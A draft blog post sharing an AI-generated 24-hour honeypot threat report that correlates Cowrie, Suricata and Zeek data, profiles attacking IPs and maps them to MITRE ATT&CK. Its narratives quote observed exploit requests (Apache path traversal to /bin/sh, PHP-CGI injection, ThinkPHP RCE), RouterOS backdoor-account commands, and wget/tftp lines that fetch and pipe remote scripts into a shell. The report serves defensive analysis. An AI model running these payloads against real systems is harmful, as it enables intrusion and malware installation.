---
title: "HoneyPi: A Sample AI-Generated Threat Report"
date: 2026-06-17
tags: [dshield, honeypot, threat-intelligence, ai, claude, cowrie, suricata, zeek, isc-internship]
draft: true
---

> I wanted to post a sample of the AI-Generated reporting that I was able to achieve with
> only a little bit of tweaking to the prompts in the base script. The value add here for
> someone in my position with limited time and resources is incredible. My next
> implementation of this, will be internal focused on that Security Onion stack and the 
> report will be directed at what I need to address daily on my internal assets. 
> 
> The point worth making again here is the tier-1 triage value: instead of paging
> through 13,000+ Cowrie events and 8,000 Suricata alerts by hand, the report surfaces
> the handful of actors that actually matter, ties their behavior together across
> streams, and maps it to MITRE ATT&CK. The four-IP `libredtail-http` cluster below is
> a good example of something that is genuinely hard to spot eyeballing raw logs but
> falls out cleanly once the streams are correlated.
> 
> I will be posting a follow up project for the internal SO stuff in the coming weeks. 
> They will be scrubbed quite a bit more since it will be internal traffic but I will layout
> how I set it up much like with this HoneyPi.

The full report, exactly as the pipeline produced it, follows.

---

> # Honeypot Threat Report — 2026-06-15 12:00 → 2026-06-16 12:00 UTC
>
> ## Executive Summary
>
> Over the 24-hour observation window, Honey Pi recorded 13,638 Cowrie events, 7,949 Suricata alerts, and 21,156 Zeek events across SSH/Telnet and HTTP attack surfaces. The most volumetrically dominant actor was **87.251.64.176**, which sustained an uninterrupted credential-stuffing campaign against the SSH honeypot across the full 24 hours, achieving 150+ successful logins using the `support:support` credential pair and generating what the data indicates is a persistent, automated brute-force tool. A coordinated cluster of four IPs (**109.100.14.222, 117.175.140.121, 117.177.102.79, 31.77.131.226**) executed an identical multi-exploit web application attack chain using the `libredtail-http` user-agent, targeting Apache path-traversal CVEs, PHP injection, ThinkPHP RCE, and Docker API enumeration. A fifth actor, **52.200.76.145**, conducted a distinct web vulnerability scan focused on environment file disclosure and the Vite arbitrary file read vulnerability (CVE-2025-30208). Separately, **185.125.201.79** achieved SSH authentication and performed file transfers totalling three distinct payload hashes against Cowrie; command data indicates a MikroTik-targeting intrusion cluster. Suricata confirmed 1,789 connections from DShield block-listed sources and 335 from CINS-tracked poor-reputation IPs, underscoring the sensor's position on active threat intelligence watchlists.
>
> ## Activity Statistics
>
> | Stream | Metric | Value |
> |---|---|---|
> | **Cowrie** | Total events | 13,638 |
> | Cowrie | Session connects | 5,461 |
> | Cowrie | Session closes | 5,447 |
> | Cowrie | Login failures | 354 |
> | Cowrie | Login successes | 329 |
> | Cowrie | Commands executed | 222 |
> | Cowrie | Direct TCP-IP requests/data | 218 / 218 |
> | Cowrie | File downloads | 12 |
> | Cowrie | Unique successful-login source IPs | ~40 |
> | **Suricata** | Total alerts | 7,949 |
> | Suricata | Severity-1 alerts | 217 |
> | Suricata | Severity-2 alerts | 6,556 |
> | Suricata | Severity-3 alerts | 1,176 |
> | Suricata | Top signature | ET DROP Dshield Block Listed Source group 1 (1,789) |
> | Suricata | Most alerted port (TCP) | 80 (591 alerts) |
> | Suricata | SSH port alerts (TCP/22) | 224 |
> | Suricata | Telnet port alerts (TCP/23) | 99 |
> | **Zeek** | Total events | 21,156 |
> | Zeek | Total connections | 18,619 |
> | Zeek | Top target port | tcp/23 (3,089 connections) |
> | Zeek | Second target port | tcp/80 (1,540 connections) |
> | Zeek | Top HTTP user-agent | Googlebot/2.1 (913 — inference: spoofed or crawler) |
> | Zeek | Second HTTP user-agent | libredtail-http (230) |
> | Zeek | Top HTTP URI | / (176) |
> | Zeek | Notable HTTP URI cluster | /vendor/phpunit/.../eval-stdin.php (multiple variants) |
>
> ## Attack Narratives
>
> ### 52.200.76.145 — Automated web scanner targeting environment file disclosure and CVE-2025-30208 (Vite arbitrary file read)
>
> **Streams active:** Zeek, Suricata
> **Score:** 144 | **Cowrie activity:** None observed
>
> **Chronological narrative:**
>
> - **2026-06-15 17:03:59** — Zeek records a single TCP/8000 connection attempt that terminates with a server-side reset (RSTO), transferring 0 bytes in both directions. No application data captured.
> - **2026-06-15 18:07:39** — A second probe, this time to TCP/80, also terminates with RSTO and zero payload. These two early connections may represent initial port availability checks.
> - **2026-06-16 02:31:41–02:31:56** — A high-velocity burst of 14 Suricata severity-3 alerts fires in 15 seconds, all matching `ET INFO Request to Hidden Environment File - Inbound` against TCP/80. This signature fires on HTTP requests for files such as `.env`, `.env.local`, `.env.backup`, and similar dot-prefixed configuration files that often contain credentials, API keys, and database connection strings. The tight timestamp clustering (sub-second inter-request gaps at points) indicates automated tooling rather than manual browsing.
> - **2026-06-16 02:31:51** — A single severity-1 alert fires: `ET WEB_SERVER Tilde in URI - potential .php~ source disclosure vulnerability`. This indicates an HTTP request for a PHP backup file (e.g., `index.php~`), a common technique to retrieve PHP source code that the web server would otherwise execute rather than return as plaintext.
> - **2026-06-16 02:32:00–02:32:02** — A cluster of severity-1 alerts fires, including:
>   - `ET WEB_SPECIFIC_APPS Vite Arbitrary File Read Via raw parameter (CVE-2025-30208)` — 14 instances across ~2 seconds. CVE-2025-30208 is an arbitrary file read vulnerability in the Vite JavaScript build tool/dev server, exploitable via manipulation of the `?raw` import parameter to read files outside the project root.
>   - `ET WEB_SERVER Likely Malicious Request for /proc/self/environ` — 3 instances. Requests for `/proc/self/environ` expose the web server process's environment variables, which may contain secrets passed via environment.
>   - `ET EXPLOIT VMware Spring Cloud Directory Traversal (CVE-2020-5410)` — 2 instances. This indicates directory traversal attempts against Spring Cloud Config Server endpoints.
>
> **Suricata identification:** Environment file harvesting (`.env` probing), PHP source disclosure via tilde, Vite dev-server arbitrary file read (CVE-2025-30208), `/proc/self/environ` leakage attempt, VMware Spring Cloud traversal (CVE-2020-5410).
>
> **ATT&CK mappings:**
>
> | Technique | ID | Basis |
> |---|---|---|
> | Exploit Public-Facing Application | T1190 | CVE-2025-30208 Vite file read, CVE-2020-5410 Spring Cloud traversal |
> | Unsecured Credentials: Credentials in Files | T1552.001 | `.env` file harvesting, `/proc/self/environ` request |
> | Search Victim-Owned Websites | T1594 | Systematic web endpoint enumeration |
>
> ### 109.100.14.222 — libredtail-http multi-exploit web RCE chain (Apache traversal, PHP injection, ThinkPHP RCE, Docker API)
>
> **Streams active:** Zeek, Suricata
> **Score:** 135 | **Cowrie activity:** None observed
>
> **Chronological narrative:**
>
> - **2026-06-15 21:09:50** — Zeek records initial TCP/80 connection (RSTO, 0 bytes), immediately followed by a successful HTTP connection (370B sent / 9393B received). Suricata simultaneously fires `ET CINS Active Threat Intelligence Poor Reputation IP group 146`, indicating this IP is on the CINS active threat intelligence blocklist prior to any exploit activity.
> - **21:09:50–21:09:51** — Two HTTP POST requests are observed:
>   1. `POST /cgi-bin/../../../../../../../../../../bin/sh` — Suricata fires `ET WEB_SERVER /bin/sh In URI Possible Shell Command Execution Attempt` and `ET EXPLOIT Apache HTTP Server 2.4.49 - Path Traversal Attempt (CVE-2021-41773) M2`. CVE-2021-41773 is a path traversal and RCE vulnerability in Apache HTTPD 2.4.49.
>   2. `POST /cgi-bin/2e2e/2e2e/2e2e/2e2e/2e2e/2e2e/2e2e/bin/sh` — `2e2e` is the URL-encoded representation of `..`, representing an obfuscated path traversal. Suricata fires `ET EXPLOIT Apache HTTP Server - Path Traversal Attempt (CVE-2021-42013) M2`, the follow-on bypass for the incomplete CVE-2021-41773 patch.
> - **21:09:51–21:09:52** — Two HTTP POST requests to `/hello.world?\\xadd+allow_url_include=1+\\xadd+auto_prepend_file=php://input` and `/?\\xadd+allow_url_include=1+\\xadd+auto_prepend_file=php://input`. These attempt to set PHP CGI configuration parameters `allow_url_include` and `auto_prepend_file` to enable remote file inclusion via the `php://input` stream wrapper. Suricata fires: `ET WEB_SERVER PHP tags in HTTP POST`, `ET WEB_SERVER allow_url_include PHP config option in uri`, `ET WEB_SERVER auto_prepend_file PHP config option in uri`, `ET WEB_SERVER PHP.//Input in HTTP POST`, `ET WEB_SERVER Generic PHP Remote File Include`, `ET HUNTING Suspicious PHP Code in HTTP POST (Inbound)`, `ET WEB_SERVER Possible SQL Injection (exec) in HTTP Request Body`, and `ET WEB_SPECIFIC_APPS PHP-CGI OS Command Injection (soft hyphen) (CVE-2024-4577)`. CVE-2024-4577 is a PHP-CGI argument injection vulnerability exploitable via soft hyphen (`\xad`) character injection.
> - **21:09:52–21:10:12** — An extended enumeration phase: the attacker systematically requests `eval-stdin.php` (a known PHPUnit test file that can execute arbitrary PHP code when accessed directly) across approximately 30 different path prefixes including `/vendor/phpunit/phpunit/src/`, `/phpunit/`, `/lib/phpunit/`, `/laravel/vendor/`, `/www/vendor/`, `/ws/vendor/`, `/yii/vendor/`, `/zend/vendor/`, `/api/vendor/`, `/demo/vendor/`, `/cms/vendor/`, `/crm/vendor/`, `/admin/vendor/`, `/backup/vendor/`, `/blog/vendor/`, `/workspace/drupal/vendor/`, `/panel/vendor/`, `/public/vendor/`, `/apps/vendor/`, and `/app/vendor/`. This is a comprehensive search for exposed PHPUnit installations across known PHP framework directory structures.
> - **21:10:12–21:10:13** — Two requests targeting the ThinkPHP `invokefunction` RCE vector: `GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello` and the `/public/` variant. Suricata fires `ET WEB_SERVER ThinkPHP RCE Exploitation Attempt` for both. The payload uses `md5("Hello")` as a fingerprinting probe — if the response contains the expected MD5 hash, the endpoint is confirmed vulnerable.
> - **21:10:13–21:10:14** — Two requests exploiting PHP `pearcmd` via the `lang` parameter for local file inclusion/RCE: first writing a PHP webshell stub to `/tmp/index1.php` via `pearcmd config-create`, then immediately attempting to include it via `?lang=../../../../../../../../tmp/index1`. This is a chained LFI-to-RCE technique.
> - **21:10:15** — Final request: `GET /containers/json`. This is a Docker Engine REST API endpoint that returns a list of all containers on the host. This represents post-exploitation enumeration targeting Docker environments.
>
> **Suricata identification:** CINS Poor Reputation IP; Apache CVE-2021-41773 and CVE-2021-42013 path traversal; PHP-CGI CVE-2024-4577 injection; PHP remote file include; PHPUnit eval-stdin RCE; ThinkPHP RCE; Docker API enumeration.
>
> **ATT&CK mappings:**
>
> | Technique | ID | Basis |
> |---|---|---|
> | Exploit Public-Facing Application | T1190 | CVE-2021-41773, CVE-2021-42013, CVE-2024-4577, ThinkPHP RCE, PHPUnit eval-stdin |
> | Server Software Component: Web Shell | T1505.003 | PHP eval-stdin.php and pearcmd webshell write attempts |
> | Virtualization/Sandbox Evasion: System Checks | T1497 | Docker API `/containers/json` container enumeration |
> | Command and Scripting Interpreter: PHP | T1059.001 (inference) | PHP injection via `php://input`, `allow_url_include`, `auto_prepend_file` |
>
> ### 117.175.140.121 — libredtail-http multi-exploit web RCE chain (identical to cluster pattern, earlier instance)
>
> **Streams active:** Zeek, Suricata
> **Score:** 132 | **Cowrie activity:** None observed
>
> **Chronological narrative:**
>
> This IP executed an attack sequence structurally identical to 109.100.14.222, occurring approximately 8 hours earlier in the observation window. The attack began at **2026-06-15 13:11:17** with initial TCP/80 probes (S1 state — SYN sent, no SYN-ACK received), followed immediately by successful HTTP connections. The complete exploit chain was replayed with the same ordering and URI set: Apache CVE-2021-41773 and CVE-2021-42013 POST requests, PHP-CGI injection via `allow_url_include`/`auto_prepend_file` (triggering the same eight Suricata signatures), PHPUnit `eval-stdin.php` enumeration across ~30 path variants, ThinkPHP `invokefunction` probe (Suricata fired `ET WEB_SERVER ThinkPHP RCE Exploitation Attempt` at 13:12:08), pearcmd LFI-to-RCE chain, and Docker API `/containers/json` enumeration — all completed within approximately 55 seconds (13:11:18–13:12:12). No CINS reputation alert was observed for this IP, unlike 109.100.14.222.
>
> The byte counts for each connection type are identical to the other cluster members (e.g., 370B/9393B for the first POST, 425B/9393B for the second, 528B/9393B for the PHP injection), strongly indicating a shared toolset or automation framework.
>
> **Suricata identification:** Apache CVE-2021-41773, CVE-2021-42013; PHP-CGI injection; PHPUnit RCE path; ThinkPHP RCE; Docker API enumeration.
>
> **ATT&CK mappings:** Identical to 109.100.14.222 — T1190, T1505.003, T1497, T1059 (inference).
>
> ### 117.177.102.79 — libredtail-http multi-exploit web RCE chain (cluster member, mid-afternoon instance)
>
> **Streams active:** Zeek, Suricata
> **Score:** 132 | **Cowrie activity:** None observed
>
> **Chronological narrative:**
>
> This IP executed the identical exploit chain as 117.175.140.121 and 109.100.14.222, beginning at **2026-06-15 15:08:29** (S1 connection state observed first, then successful HTTP at 15:08:31). The full sequence — Apache CVE-2021-41773 and CVE-2021-42013 POSTs, PHP-CGI injection (same eight Suricata signatures), PHPUnit eval-stdin.php enumeration across ~30 path prefixes, ThinkPHP `invokefunction` probe (Suricata alert at 15:09:29), pearcmd LFI-to-RCE, Docker API `/containers/json` — completed by 15:09:34, approximately 65 seconds total. Byte-count patterns across connections are again consistent with the cluster (370B/9393B, 425B/9393B, 528B/9393B). The geographic source (117.177.x.x range — inference: Chinese address block based on IANA allocation) differs from 109.100.14.222, suggesting either distributed nodes or exit points of a single campaign infrastructure.
>
> **Suricata identification:** Apache CVE-2021-41773, CVE-2021-42013; PHP-CGI injection; PHPUnit RCE; ThinkPHP RCE; Docker API enumeration.
>
> **ATT&CK mappings:** Identical to 109.100.14.222 — T1190, T1505.003, T1497, T1059 (inference).
>
> ### 31.77.131.226 — libredtail-http multi-exploit web RCE chain (cluster member, evening instance)
>
> **Streams active:** Zeek, Suricata
> **Score:** 132 | **Cowrie activity:** None observed
>
> **Chronological narrative:**
>
> This IP executed the same exploit chain beginning at **2026-06-15 18:47:52** (RSTO on initial probe, successful HTTP at 18:47:53). The complete attack sequence — Apache CVE-2021-41773 POST, CVE-2021-42013 POST, PHP-CGI `allow_url_include`/`auto_prepend_file` injection (same eight Suricata signatures at 18:47:54–18:47:55), PHPUnit eval-stdin.php enumeration across ~30 path variants, ThinkPHP `invokefunction` probe (Suricata alert at 18:48:15), pearcmd LFI-to-RCE, Docker API `/containers/json` — completed by 18:48:18, approximately 26 seconds total. The execution pace is the fastest of the four cluster members. Byte-count fingerprint is identical across all comparable connection records.
>
> **Cluster assessment (inference):** The four IPs (109.100.14.222, 117.175.140.121, 117.177.102.79, 31.77.131.226) share: (1) identical `libredtail-http` user-agent string, (2) identical HTTP request sequencing and URI set, (3) identical byte-count fingerprint per connection type, (4) terminal Docker API enumeration. This is consistent with a single automated scanning tool or botnet campaign operating from distributed nodes. The `libredtail-http` user-agent is not associated with a known legitimate crawler; it is observed exclusively in exploit traffic in this dataset.
>
> **Suricata identification:** Apache CVE-2021-41773, CVE-2021-42013; PHP-CGI injection; PHPUnit RCE; ThinkPHP RCE; Docker API enumeration.
>
> **ATT&CK mappings:** Identical to 109.100.14.222 — T1190, T1505.003, T1497, T1059 (inference).
>
> ## Credential Attack Analysis
>
> ### SSH/Telnet Brute Force Overview
>
> The Cowrie honeypot recorded 354 login failures and 329 login successes across the 24-hour window. The high success rate relative to failures reflects the intentional acceptance posture of the honeypot rather than attacker credential quality.
>
> **Notable credential patterns:**
>
> | Observation | Detail |
> |---|---|
> | Protocol confusion: HTTP headers as credentials | Multiple IPs submitted raw HTTP request lines (`GET / HTTP/1.1`) as SSH usernames (19 occurrences), indicating scanners that do not discriminate between service types on non-standard ports. This is also observed with `GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1` (InfluxDB/TSDB probe) and `GET /cgi-bin/authLogin.cgi HTTP/1.1` (QNAP probe). |
> | Scanner self-identification | IPs 85.217.149.9/18/21/58/59/62 submitted `User-Agent: Mozilla/5.0 (compatible; ModatScanner/1.2; +https://modat.io/)` as the SSH username field; IPs 64.62.156.152/192 and 159.89.111.189/161.35.79.204/206.81.19.9/161.35.203.187 submitted HTTP user-agent strings. These sessions represent non-SSH clients probing the SSH port without completing the SSH handshake properly. |
> | Default/weak credential usage | Dominant credential pairs: `admin:admin` (most frequent success), `root:123456`, `support:support`, `root:admin`. These target IoT/router default credentials. |
> | Vendor-specific credentials | `AdminGPON/ALC#FGU` — a known default credential for GPON optical network terminal devices. `root:h3c.com!` — a default credential associated with H3C/HPE networking equipment (observed from 120.193.9.169 and 47.118.30.89). |
> | Hostile credentials | `root/---fuck_you----` and `root/\ufeff------fuck------` (BOM-prefixed) — aggressive/taunting passwords included in some credential lists. |
> | Cryptocurrency targeting | `solana/solana` credential pair — targeting systems configured for Solana cryptocurrency node/wallet operations. |
> | Malformed password | `*1/$4` — a credential pair that may represent a garbled MySQL password hash fragment, possibly from a misconfigured credential list. |
>
> ### Most Persistent Actor: 87.251.64.176
>
> This source IP logged **150+ successful Cowrie logins** across the entire 24-hour window using exclusively `support:support`, averaging approximately one successful session every 5–8 minutes throughout the full observation period (earliest observed: 2026-06-15 00:00:07 UTC; latest within window: 2026-06-16 06:26:28 UTC). No Suricata alerts or Zeek HTTP activity were associated with this IP in the supplied data. The regularity of authentication events (consistent ~5-minute inter-session intervals with minor variation) and the exclusive use of a single credential pair are consistent with automated tooling. No post-authentication command execution was recorded for this IP in the supplied data.
>
> ### MikroTik-Targeting Cluster: 107.189.17.96
>
> IP 107.189.17.96 achieved three successive successful Cowrie logins at 13:45:30 (`root:admin`), 13:48:28 (`root:123456`), and 13:49:28 (`support:support`), and 13:51:47 (`admin:admin`). The command set recorded in aggregate Cowrie data — `enable`, `system`, `/file print`, `uname -s -m`, `linuxshell`, `system resource print 2>/dev/null`, `put test 2>/dev/null`, `/system backup save name=debi`, `/system backup save name=debi dont-encrypt=yes`, `/user print`, `/user add name=debi_full group=full password=debi123`, `/user set admin group=full`, `/user active print`, `/export`, `/user print detail` — represents MikroTik RouterOS command syntax. Specifically, `/system backup save`, `/user add`, and `/user set` are RouterOS CLI commands (not Linux shell commands). This actor is testing for RouterOS access. The username `debi_full` and password `debi123` added via `/user add` is consistent with a botnet maintaining persistent administrative backdoor accounts on compromised MikroTik devices. The commands `(wget http://162.248.101.153/n2/telnet -O-|sh)&` and `(tftp -g -r telnet 51.81.104.123 -l - |sh)&` in the aggregate command set (sourced from post-authentication sessions across the honeypot) indicate additional actors attempting to download and execute shell scripts via wget/TFTP from external hosts.
>
> ---
> *Generated 2026-06-16 12:02 UTC | cowrie=13638 suricata=7949 zeek=21156 | 2848 scored attackers*
